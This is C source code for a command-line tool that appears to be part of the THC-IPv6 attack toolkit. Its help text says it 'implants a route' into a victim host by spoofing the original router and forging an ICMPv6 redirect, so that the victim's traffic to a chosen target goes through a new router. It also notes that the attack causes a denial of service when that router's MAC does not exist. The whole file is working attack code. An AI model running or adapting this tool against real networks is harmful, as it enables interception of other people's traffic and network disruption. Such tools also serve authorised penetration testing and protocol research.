#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2020 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf(
      "Syntax: %s interface victim-ip target-ip original-router new-router "
      "[new-router-mac] [hop-limit]\n\n",
      prg);
  printf(
      "Implant a route into victim-ip, which redirects all traffic to "
      "target-ip to\n");
  printf("new-ip. You must know the router which would handle the route.\n");
  printf("If the new-router-mac does not exist, this results in a DOS.\n");
  printf(
      "If the TTL of the target is not 64, then specify this is the last "
      "option.\n");
  //  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  unsigned char *pkt = NULL, buf[16], mac[16] = "";
  unsigned char *mac6 = mac, *src6, *target6, *oldrouter6, *newrouter6, *self6,
                *fakemac;
  thc_ipv6_hdr *ipv6;
  char *        interface;
  int           pkt_len, rawmode = 0, ttl = 64, offset = 14;

  if (argc < 6 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  if (strcmp(argv[1], "-r") == 0) {
    thc_ipv6_rawmode(1);
    rawmode = 1;
    argv++;
    argc--;
  }

  if (do_hdr_size) offset = do_hdr_size;
  interface = argv[1];
  src6 = thc_resolve6(argv[2]);
  target6 = thc_resolve6(argv[3]);
  oldrouter6 = thc_resolve6(argv[4]);
  if ((newrouter6 = thc_resolve6(argv[5])) == NULL) {
    fprintf(stderr, "Error: %s does not resolve to a valid IPv6 address\n",
            argv[5]);
    exit(-1);
  }

  if (thc_get_own_mac(interface) == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }
  /* Spoof source mac */
  if ((self6 = thc_get_own_ipv6(interface, oldrouter6, PREFER_GLOBAL)) ==
      NULL) {
    fprintf(stderr,
            "Error: could not get own IP address to contact original-router\n");
    exit(-1);
  }
  if ((fakemac = thc_get_mac(interface, self6, oldrouter6)) == NULL) {
    fprintf(stderr,
            "Error: could not resolve mac address for original-router\n");
    free(self6);
    exit(-1);
  }

  if (rawmode == 0) {
    if (argc >= 7)
      sscanf(argv[6], "%x:%x:%x:%x:%x:%x", (unsigned int *)&mac[0],
             (unsigned int *)&mac[1], (unsigned int *)&mac[2],
             (unsigned int *)&mac[3], (unsigned int *)&mac[4],
             (unsigned int *)&mac[5]);
    else
      mac6 = thc_get_own_mac(interface);
  }

  if (argc >= 8) ttl = atoi(argv[7]);
  if (ttl <= 0 || ttl > 255) ttl = 64;

  memset(buf, 'A', 16);

  if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len,
                                      target6, src6, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xfacebabe,
                    (unsigned char *)&buf, 16, 0) < 0)
    return -1;
  if (thc_generate_and_send_pkt(interface, fakemac, NULL, pkt, &pkt_len) < 0) {
    fprintf(stderr, "Error: Can not send packet, exiting ...\n");
    exit(-1);
  }

  usleep(25000);
  ipv6 = (thc_ipv6_hdr *)pkt;
  thc_inverse_packet(ipv6->pkt + offset, ipv6->pkt_len - offset);
  ipv6->pkt[offset + 7] = (unsigned char)ttl;

  thc_redir6(interface, oldrouter6, fakemac, NULL, newrouter6, mac6,
             ipv6->pkt + 14, ipv6->pkt_len - 14);
  printf("Sent ICMPv6 redirect for %s\n", argv[3]);

  free(self6);
  free(fakemac);

  return 0;
}
